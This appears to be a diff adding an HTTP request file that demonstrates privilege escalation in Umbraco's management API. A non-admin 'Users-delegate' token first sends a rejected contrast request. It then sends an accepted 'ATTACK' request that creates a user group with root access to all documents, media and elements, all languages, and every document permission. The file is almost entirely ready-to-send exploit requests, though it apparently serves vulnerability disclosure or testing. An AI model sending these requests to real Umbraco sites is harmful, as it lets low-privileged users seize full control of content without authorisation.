@@ -1,0 +1,70 @@
+# All requests below are sent as the NON-ADMIN Users-delegate bearer.
+
+### CONTRAST — specific out-of-scope node D2 (REJECTED):
+POST http://localhost:29184/umbraco/management/api/v1/user-group HTTP/1.1
+Authorization: Bearer <users-delegate-token>
+Content-Type: application/json
+
+{
+  "name": "try_node",
+  "alias": "vgb53b90cd",
+  "icon": "icon-users",
+  "sections": [
+    "Umb.Section.Users",
+    "Umb.Section.Content"
+  ],
+  "languages": [],
+  "hasAccessToAllLanguages": false,
+  "documentStartNode": {
+    "id": "b862373c-aae2-4e1f-b121-a4c5d3fafeae"
+  },
+  "documentRootAccess": false,
+  "mediaStartNode": null,
+  "mediaRootAccess": false,
+  "elementStartNode": null,
+  "elementRootAccess": false,
+  "fallbackPermissions": [
+    "Umb.Document.Read"
+  ],
+  "permissions": []
+}
+
+### ATTACK — whole-tree root access + all media + all languages + all verbs (ACCEPTED):
+POST http://localhost:29184/umbraco/management/api/v1/user-group HTTP/1.1
+Authorization: Bearer <users-delegate-token>
+Content-Type: application/json
+
+{
+  "name": "SelfEscalation_cfccf2",
+  "alias": "vg3c8eb29e",
+  "icon": "icon-users",
+  "sections": [
+    "Umb.Section.Users",
+    "Umb.Section.Content"
+  ],
+  "languages": [],
+  "hasAccessToAllLanguages": true,
+  "documentStartNode": null,
+  "documentRootAccess": true,
+  "mediaStartNode": null,
+  "mediaRootAccess": true,
+  "elementStartNode": null,
+  "elementRootAccess": true,
+  "fallbackPermissions": [
+    "Umb.Document.Read",
+    "Umb.Document.Create",
+    "Umb.Document.Update",
+    "Umb.Document.Delete",
+    "Umb.Document.Publish",
+    "Umb.Document.Unpublish",
+    "Umb.Document.Move",
+    "Umb.Document.Sort",
+    "Umb.Document.Rollback",
+    "Umb.Document.Permissions",
+    "Umb.Document.PublicAccess",
+    "Umb.Document.CultureAndHostnames",
+    "Umb.Document.Duplicate",
+    "Umb.Document.Notifications"
+  ],
+  "permissions": []
+}
